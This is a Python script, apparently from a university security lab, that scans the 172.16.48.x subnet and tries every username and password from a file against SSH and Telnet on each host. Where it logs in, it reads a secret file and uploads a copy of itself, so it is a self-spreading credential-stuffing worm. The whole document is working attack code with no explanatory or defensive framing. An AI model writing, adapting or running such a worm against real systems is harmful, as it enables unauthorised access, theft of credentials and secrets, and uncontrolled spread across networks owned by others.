import os
import queue
import socket
import subprocess
import sys
import telnetlib
import threading
import time

import paramiko

ip_range = "172.16.48."
creds = []

with open("Q2pwd") as f:
    for line in f:
        user, password = line.split(" ")
        creds.append((user.strip(), password.strip()))

def ssh_connect(ip, creds):
    for user, password in creds:
        try:
            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            ssh.connect(ip, username=user, password=password, timeout=0.5, banner_timeout=0.5)
            stdin, stdout, stderr = ssh.exec_command("cat ~/Q2secret")
            flag = stdout.read().decode("utf-8")
            if flag:
                print("[SSH] Obtained the secret: {}:{}:{}:{}".format(ip, user, password, flag))
            
            sftp = ssh.open_sftp()
            sftp.put("Q2worm.py", "Q2worm.py")
            sftp.close()

            print("[SSH] Success: {}:{}:{}".format(ip, user, password))
            ssh.close()
        except paramiko.AuthenticationException:
            print("[SSH] Auth Failed: {}:{}:{}".format(ip, user, password))
        except:
            print("[SSH] Error: {}:{}:{}".format(ip, user, password))
            break

def telnet_connect(ip, creds):
    for user, password in creds:
        try:
            tn = telnetlib.Telnet(ip, timeout=0.5)
            tn.read_until(b"cse3140-HVM-domU login: ")
            tn.write(user + "\n")
            tn.read_until(b"Password: ")
            tn.write(password + "\n")

            tn.write("exit\n")

            print("[Telnet] Success: {}:{}:{}".format(ip, user, password))
        except socket.timeout:
            print("[Telnet] Error: {}:{}:{}".format(ip, user, password))
            break
        except Exception as e:
            print(e)
            if e.args[0] == "Login incorrect":
                print("[Telnet] Auth Failed: {}:{}:{}".format(ip, user, password))
            else: print("[Telnet] Unexpected Error: {}:{}:{}".format(ip, user, password))

def main():
    for ip in range(1, 255):
        ip = ip_range + str(ip)
        ssh_thread = threading.Thread(target=ssh_connect, args=(ip, creds))
        telnet_thread = threading.Thread(target=telnet_connect, args=(ip, creds))
        ssh_thread.start()
        telnet_thread.start()
        ssh_thread.join()
        telnet_thread.join()

if __name__ == "__main__":
    main()